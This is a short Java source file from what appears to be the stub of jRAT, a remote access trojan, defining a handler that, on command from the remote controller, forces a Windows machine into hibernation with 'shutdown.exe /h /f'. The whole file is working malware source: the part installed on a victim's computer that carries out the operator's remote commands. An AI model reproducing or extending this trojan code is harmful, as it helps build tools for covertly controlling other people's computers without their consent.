package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

import com.redpois0n.oslib.OperatingSystem;

public class Packet31ComputerSleep extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe /h /f");
		}
	}

}
